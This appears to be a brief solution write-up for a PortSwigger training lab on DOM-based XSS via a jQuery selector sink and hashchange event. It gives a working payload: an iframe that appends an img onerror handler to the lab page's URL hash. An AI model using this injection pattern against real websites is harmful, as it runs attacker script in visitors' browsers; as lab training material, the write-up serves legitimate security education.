# DOM XSS in jQuery selector sink using a hashchange event

Link to Lab :- `https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event`

![image](https://user-images.githubusercontent.com/60841283/153715819-9a062dcf-58e4-45a5-a189-aac07f5687c4.png)

Payload in exploit server (in Body section) :-
```html
<iframe src="https://ac331fde1fa05e1cc0f74e150069006e.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
